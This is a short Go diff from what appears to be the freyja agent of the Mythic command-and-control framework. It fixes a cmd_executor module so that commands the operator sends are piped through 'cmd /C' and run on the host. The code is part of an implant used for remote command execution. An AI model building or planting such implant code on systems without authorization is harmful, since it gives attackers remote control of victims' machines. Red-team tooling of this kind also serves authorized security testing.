@@ -13,18 +13,18 @@ import (
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/structs"
 )
 
-// Run - Function that executes the powershell_executor command
+// Run - Function that executes the cmd_executor command
 func Run(task structs.Task) {
 	msg := task.NewResponse()
-	cmdBin := "cmd /C"
-	//arg1 := "/C"
+	cmdBin := "cmd"
+	arg1 := "/C"
 	if _, err := exec.LookPath(cmdBin); err != nil {
 		msg.SetError("Could not find cmd.exe ")
 		task.Job.SendResponses <- msg
 		return
 	}
 
-	command := exec.Command(cmdBin)
+	command := exec.Command(cmdBin, arg1)
 	command.Stdin = strings.NewReader(task.Params)
 	command.Env = os.Environ()
 
